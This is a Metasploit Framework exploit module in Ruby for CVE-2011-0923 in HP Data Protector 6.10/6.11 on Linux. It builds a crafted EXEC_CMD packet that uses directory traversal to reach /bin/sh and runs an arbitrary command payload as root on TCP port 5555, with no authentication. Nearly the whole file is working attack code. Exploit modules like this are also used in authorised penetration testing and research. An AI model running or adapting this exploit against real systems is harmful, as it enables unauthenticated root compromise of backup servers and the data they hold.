# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include Msf::Exploit::Remote::Tcp
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;            => &#039;HP Data Protector 6.1 EXEC_CMD Remote Code Execution&#039;,
            &#039;Description&#039;     => %q{
                This exploit abuses a vulnerability in the HP Data Protector service. This
                flaw allows an unauthenticated attacker to take advantage of the EXEC_CMD
                command and traverse back to /bin/sh, this allows arbitrary remote code
                execution under the context of root.
            },
            &#039;Author&#039;          =>
                [
                    &#039;ch0ks&#039;,    # poc
                    &#039;c4an&#039;,     # msf poc
                    &#039;wireghoul&#039; # Improved msf
                ],
            &#039;References&#039;      =>
                [
                    [ &#039;CVE&#039;, &#039;2011-0923&#039;],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-11-055/&#039;],
                    [ &#039;URL&#039;, &#039;http://c4an-dl.blogspot.com/hp-data-protector-vuln.html&#039;],
                    [ &#039;URL&#039;, &#039;http://hackarandas.com/blog/2011/08/04/hp-data-protector-remote-shell-for-hpux&#039;]
                ],
            &#039;DisclosureDate&#039;  => &#039;Feb 7 2011&#039;,
            &#039;Platform&#039;        => [ &#039;unix&#039;,&#039;linux&#039;],
            &#039;Arch&#039;            => ARCH_CMD,
            &#039;Payload&#039;         =>
                {
                    &#039;Space&#039;       => 10000,
                    &#039;DisableNops&#039; => true,
                    &#039;Compat&#039;      => { &#039;PayloadType&#039; => &#039;cmd&#039; }
                },
            &#039;Targets&#039;         =>
                [
                    [ &#039;HP Data Protector 6.10/6.11 on Linux&#039;, {}]
                ],
            &#039;DefaultTarget&#039;   => 0
        ))
        register_options([Opt::RPORT(5555),], self.class)
    end
    def exploit
        user = rand_text_alpha(4)
        packet = "\x00\x00\x00\xa4\x20\x32\x00\x20"
        packet << user*2
        packet << "\x00\x20\x30\x00\x20"
        packet << "SYSTEM"
        packet << "\x00\x20\x63\x34\x61\x6e"
        packet << "\x20\x20\x20\x20\x20\x00\x20\x43\x00\x20\x32\x30\x00\x20"
        packet << user
        packet << "\x20\x20\x20\x20\x00\x20"
        packet << "\x50\x6f\x63"
        packet << "\x00\x20"
        packet << "NTAUTHORITY"
        packet << "\x00\x20"
        packet << "NTAUTHORITY"
        packet << "\x00\x20"
        packet << "NTAUTHORITY"
        packet << "\x00\x20\x30\x00\x20\x30\x00\x20"
        packet << "../../../../../../../../../../"
        shell_mio = "bin/sh"
        salto = "\n"
        s = salto.encode
        shell = shell_mio
        shell << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        shell << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        shell << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        shell << payload.encoded
        shell << s
        sploit = packet + shell
        begin
            print_status("Sending our commmand...")
            connect
            sock.put(sploit)
            print_status("Waiting ...")
            handler
            # Read command output from socket if cmd/unix/generic payload was used
            if (datastore[&#039;CMD&#039;])
                res = sock.get
                print_status(res.to_s) if not res.empty?
            end
        rescue
            print_error("Error in connection or socket")
        ensure
            disconnect
        end
    end
end



